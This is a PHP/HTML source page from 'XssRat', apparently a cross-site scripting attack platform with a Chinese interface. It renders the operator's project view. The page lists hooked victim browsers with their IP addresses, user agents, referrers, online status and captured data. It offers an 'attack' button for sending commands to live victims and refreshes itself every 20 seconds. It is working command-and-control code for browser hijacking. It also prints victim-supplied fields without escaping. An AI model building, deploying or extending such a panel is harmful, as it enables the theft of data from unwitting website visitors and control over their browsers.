<?php include("./include/sess.php");  ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta name="Keywords" content="Xss,Cross Site Script,Web Vulnerability, CSRF,Hack,Information Security, Xss Platform, Xss Framework" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>XssRat Project Page</title>
<link rel="shortcut icon" href="images/xssrat.ico" type="image/x-icon" />
<link rel="stylesheet" type="text/css"  href="css/main.css" />
<link rel="stylesheet" type="text/css"  href="css/bootstrap.min.css" />
<link rel="stylesheet" type="text/css"  href="css/bootstrap-theme.min.css" />
<link rel="stylesheet" type="text/css"  href="css/jquery.snippet.min.css" />
<script language="javascript" src="js/jquery-1.11.0.min.js"></script>
<script language="javascript" src="js/jquery-migrate-1.0.0.js"></script>
<script language="javascript" src="js/bootstrap.min.js"></script>
<script language="javascript" src="js/xssrat.js"></script>
<script language="javascript" src="js/json2.js"></script>
<script language="javascript" src="js/ajaxfileupload.js"></script>
<script language="javascript" src="js/jquery.snippet.js"></script>
<script type="text/javascript" >
function selectAll(){
	if($('#checkall').prop('checked')){
		$('.choose-ck').each(function(){
			if(!$(this).prop('disabled')) $(this).prop('checked',true);
		});	
	}else{
		$('.choose-ck').each(function(){
			if(!$(this).prop('disabled')) $(this).prop('checked',false);
		});	
	}
}

function delPMD(){
	var pmds= new Array();
	$('.choose-ck').each(function(){
		if(!$(this).prop('disabled')){
			if($(this).prop('checked')){
				var pmd = {pmd_id:$(this).attr('value'),p_id:$(this).attr('for')};
				pmds.push(pmd);
			}
		}
	});
	if(pmds.length>0){
		var DD = {op:"del",data:pmds};
		xssrat.delData(DD,'./bin/action/pmd.php',true);
	}		
}

function attackPage(pmd_id){
	window.location.href = "diningRoom.php?pmd_id="+pmd_id;
}


$(function(){
	//隐藏所有data box
	$(".data-box").removeClass("show").addClass("hidden");
	$(".collapse-down").removeClass("glyphicon-chevron-down").addClass("glyphicon-chevron-right");
	//默认展开第一个data box
	$(".data-box:first").removeClass("hidden").addClass("show");
	$(".collapse-down:first").removeClass("glyphicon-chevron-right").addClass("glyphicon-chevron-down");
	$(".collapse-control").bind("click",function(){
		var id = $(this).attr("for");
		if($("#"+id).css("display")=="none"){
			$("#"+id).removeClass("hidden").addClass("show");
			$("span[for='"+id+"']").removeClass("glyphicon-chevron-right").addClass("glyphicon-chevron-down");
		}else {
			$("#"+id).removeClass("show").addClass("hidden");
			$("span[for='"+id+"']").removeClass("glyphicon-chevron-down").addClass("glyphicon-chevron-right");
		}
	});
	setInterval("location.reload()",20000);
	
});
</script>

</head>

<body>
<!-- the head begind -->
<?php include("./include/head.php");  ?>
<!-- the head end -->
<?php 
require_once("bin/Path.php");
require_once(PHP_BASE_DIR."/db/MySQL.php"); 
require_once(PHP_BASE_DIR."/entity/Module.php");
require_once(PHP_BASE_DIR."/entity/Project.php");
require_once(PHP_BASE_DIR."/entity/ProjectModuleData.php");
 
$p_id = $_GET['p_id'];
$p_id = $p_id?(int)$p_id:0;
$res = false;

if($p_id>0){
	$db = new MySQL($log);
	$mysqli = $db->openDB();
	if($mysqli!=null){
		$project = new Project($mysqli,$log);
		$pmData = new ProjectModuleData($mysqli,$log);
		$module = new Module($mysqli,$log);
		$res = $project->getProjectById($p_id);
		if($res && $user_info['id'] === $project->u_id){// 如果项目存在且拥有者是当前用户
			$pmDatas = $pmData->getPMDByProject($p_id);
			$module ->getModuleByID($project->m_id);
			$pmd_num = count($pmDatas);
		}

	}
	
}


?>

<!-- main begin -->
<div class="container">
	<!--the row jumb begin-->
	<div class="row jumb">
		<!--the left begin -->
		<?php include("include/menu.php");  ?>
		<!--the left end -->		
		
		<!--the right begin -->
		<div class="col-md-10 ">
		
		<!-- the breadcrumb begin -->
		<ol class="breadcrumb">
		  <li><a href="main.php">Home</a></li>
		  <li class="active">Project</li>
		</ol>
		<!-- the breadcrub end -->
		
			<div class="panel panel-default ">
				<div class="panel-heading">项目</div>
				<!-- the panel body begin-->
				<div class="panel-body">
				
					<div class="row">
						<div class="col-md-9">
	      					<p><strong class="text-info">项目名称</strong>&nbsp;&nbsp;<?php echo $project->name ?> &nbsp;&nbsp;&nbsp;
	      					   <strong class="text-info">创建时间</strong>&nbsp;&nbsp;<?php echo $project->timestamp ?> &nbsp;&nbsp;&nbsp;
	      					   <strong class="text-info">攻击模块</strong>&nbsp;&nbsp;<?php echo $module->m_name ?>  &nbsp;&nbsp;&nbsp;
	      					</p>
	      					<p>
	      					 	<strong class="text-info">项目描述</strong>&nbsp;&nbsp;<?php echo $project->discribe ?>
	      					</p>      						
	    				</div>
    				
	    				<div class="col-md-3 ">
							<div class="left-bt pull-right">
								<input type="checkbox" id="checkall" onclick="selectAll();" />&nbsp;&nbsp;<panel>全选</panel>
								&nbsp;&nbsp;&nbsp;&nbsp;
								<button type="button" onclick="delPMD();" class="btn btn-danger btn-sm">
								<span class="glyphicon glyphicon-remove"></span> 删除
								</button>
							</div>
	    				</div>
    				</div>
				</div>
				<!-- the panel body end -->
			</div><!-- the panel  end -->
			
			<?php if(!empty($pmd_num)&&$pmd_num>0){
					foreach($pmDatas as $pmd){
			?>
			<div class="data-container small">
				<div class="data-info">
					<div class="row">
						<div class="col-md-9 collapse-control" for="<?php echo $pmd->pmd_id ?>" >
							<p><strong class="text-info">IP</strong>&nbsp;&nbsp;<?php echo $pmd->clientIP ?>&nbsp;&nbsp;&nbsp;&nbsp;<strong class="text-info">时间</strong>&nbsp;&nbsp;<?php echo $pmd->time ?>
                            &nbsp;&nbsp;&nbsp;&nbsp;<strong class="text-info">状态</strong>&nbsp;&nbsp;
                            <?php if(strtotime("now")-strtotime($pmd->uptime)<10) echo"<font color=\"#00CC99\">在线</font>"; 
									else echo"<font color=\"#CC0033\">离线</font>";	
							 ?>
                            </p>
							<p><strong class="text-info">UserAgent</strong>&nbsp;&nbsp;<?php echo $pmd->userAgent ?></p>
							<p><strong class="text-info">Refer</strong>&nbsp;&nbsp;<?php echo $pmd->Referer ?></p>
						</div>
						
						<div class="col-md-3">
							<div class="left-check pull-right  text-center">
                            <button type="button" onclick="attackPage(<?php echo $pmd->pmd_id ?>);"  <?php if(strtotime("now")-strtotime($pmd->uptime)>10) echo"disabled=\"disabled\"";  ?> class="btn btn-warning  btn-sm">
								<span class="glyphicon glyphicon-flash"></span> 攻击
							</button>&nbsp;&nbsp;&nbsp;&nbsp;
							<panel>选择</panel>&nbsp;&nbsp; <input class="choose-ck" type="checkbox" value="<?php echo $pmd->pmd_id ?>"  for="<?php echo $pmd->p_id ?>" />&nbsp;&nbsp;
							<span class="glyphicon glyphicon-chevron-down collapse-down collapse-control" for="<?php echo $pmd->pmd_id ?>" ></span>
							</div>
						</div>
					</div>
				</div>
				<script langage="javascript">
				$(function(){
					var jsonObj = <?php 
						$dt = json_decode($pmd->Data);
						if($dt){
							echo utf8_encode(json_encode($dt));
						}else echo "'".utf8_encode($pmd->Data)."'";
					  ?>;
					$("#<?php echo $pmd->pmd_id ?>").html(xssrat.json2li(jsonObj));
				});
				</script>
				<div class="data-box" id="<?php echo $pmd->pmd_id ?>" >
				</div>
			</div>
			
			<?php
					}
			} ?>
			
		</div>
		<!--the right end -->
	</div>
	<!--the row jumb end -->
</div>

<!-- Error Msg Modal -->
<div class="modal fade" id="alert_modal" tabindex="-1" role="dialog" aria-labelledby="消息" aria-hidden="true">
	<div class="modal-dialog modal_small">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
        <h4 class="modal-title" id="modal_msg">消息</h4>
      </div>
      <div class="modal-body">
        <div id="alert_msg"></div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-primary" data-dismiss="modal">确定</button>
      </div>
    </div><!-- /.modal-content -->
  </div><!-- /.modal-dialog -->
</div><!--modal-->


<?php include "include/footer.php"; ?>


</body>
</html>


